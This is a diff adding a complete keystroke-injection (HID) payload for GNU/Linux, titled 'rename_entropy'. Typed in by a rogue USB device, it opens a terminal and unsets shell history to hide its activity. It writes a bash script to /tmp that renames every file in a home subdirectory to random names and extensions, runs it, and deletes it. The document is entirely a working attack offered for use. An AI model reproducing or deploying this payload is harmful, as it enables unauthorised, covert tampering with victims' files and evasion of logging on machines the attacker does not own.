@@ -1,0 +1,22 @@
+REM Title: rename_entropy
+REM Description: rename_entropy, rename_entropy is a powerful payload which renames target files with extensions.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Execution.
+REM Target: GNU/Linux.
+REM Attackmodes: HID.
+
+DELAY 1000
+CTRL ALT t
+DELAY 500
+STRING unset HISTFILE 
+ENTER
+DELAY 100
+STRING echo -e "#\!/bin/bash\ndir=\"/home/\$(whoami)/testdir/\"\ncd \"\$dir\" || exit\nfor file in *; do\n\trand_str=\$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)\n\trand_ext=\$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 3 | head -n 1)\n\tmv \"\$file\" \"\${rand_str}.\${rand_ext}\"\ndone" > /tmp/sys
+ENTER
+DELAY 200
+STRING chmod +x /tmp/sys
+ENTER
+DELAY 200
+STRING /tmp/./sys && rm /tmp/sys && exit
+ENTER
